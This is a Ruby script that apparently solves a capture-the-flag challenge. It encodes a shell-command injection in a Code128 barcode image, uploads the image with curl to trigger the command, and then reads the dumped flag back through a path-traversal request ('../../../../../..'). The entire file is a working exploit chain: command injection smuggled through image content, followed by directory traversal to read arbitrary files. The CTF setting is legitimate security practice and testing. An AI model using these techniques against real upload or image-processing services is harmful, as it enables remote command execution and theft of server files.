require './libronsolve'
require 'httparty'

# Use a static filename since it's difficult to delete it
FILENAME = "/tmp/15a56fec-2036-4278-95d0-4d8e28507049".freeze

# Use curl to make things simple
def run_command(cmd)
  system("./code128png ./exploit.png \"test\\\", \\\"node\\\": \\\"hi'; #{cmd}; #\"")
  system("mogrify -resize '200%x200%' ./exploit.png")
  system('montage -tile 1x2 -geometry +8+8 ./exploit.png ./upc.png ./combined.png')
  system("curl -F \"photo=@./combined.png\" #{get_url()}/upload")
  File.delete('./exploit.png')
end

# Print the flag into a file in /tmp
run_command("/home/ctf/print-flag > #{FILENAME}")

# Retrieve the file
out = HTTParty.get("#{get_url()}/display?name=../../../../../..#{FILENAME}")

if !out
  puts "Couldn't connect to #{get_url()}!"
  exit 1
end

# Delete the file as best as we can
run_command("echo>#{FILENAME}")

if out.parsed_response['error']
  puts "Something went wrong:"
  exit 1
else
  check_flag(out.parsed_response, terminate: true)
end
